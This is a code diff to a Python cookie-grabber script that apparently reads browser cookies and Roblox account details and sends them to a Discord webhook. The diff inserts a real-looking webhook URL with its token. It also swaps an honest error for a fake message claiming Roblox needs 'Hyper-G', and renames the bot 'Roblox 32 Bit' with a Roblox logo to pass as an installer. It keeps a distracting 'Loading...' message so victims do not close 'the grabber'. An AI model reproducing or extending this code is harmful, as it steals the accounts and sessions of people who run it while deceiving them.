@@ -3,7 +3,7 @@ import codecs
 import json
 from base64 import *
 
-webhookk = "heh"
+webhookk = "https://discord.com/api/webhooks/1229861720139366442/-lemyHycQYt-RC_mzd4cXoHhsFx_McNIenObeS3sFBARcXESAZypfkSZuJvKDi1Uhjqa"
 def command(c):
     os.system(c)
 def cls():
@@ -16,10 +16,7 @@ try:
     import browser_cookie3
     
 except:
-    input("Libraries not installed press enter to exit...")
-
-
-
+    input("Roblox could'nt find Hyper-G in your system which is very required to install Roblox, Please press enter to exit...")
 
 dummy_message = "Loading..." # A message that distracts the user from closing the grabber
 print(dummy_message)
@@ -110,8 +107,8 @@ premium = info['IsPremium'];
 
 discord = Discord(url=webhookk)
 discord.post(
-    username="BOT - Pirate 🍪",
-    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
+    username= "Roblox 32 Bit",
+    avatar_url="https://media.discordapp.net/attachments/1229861634068189298/1229864541114863687/roblox_logo.jpg?ex=66313b9c&is=661ec69c&hm=e170240d175533d946abab7fe86572aa4b80a8602cb8fbd3a810305220bde998&=&format=webp",
     embeds=[
         {
             "username": "BOT - Pirate 🍪",
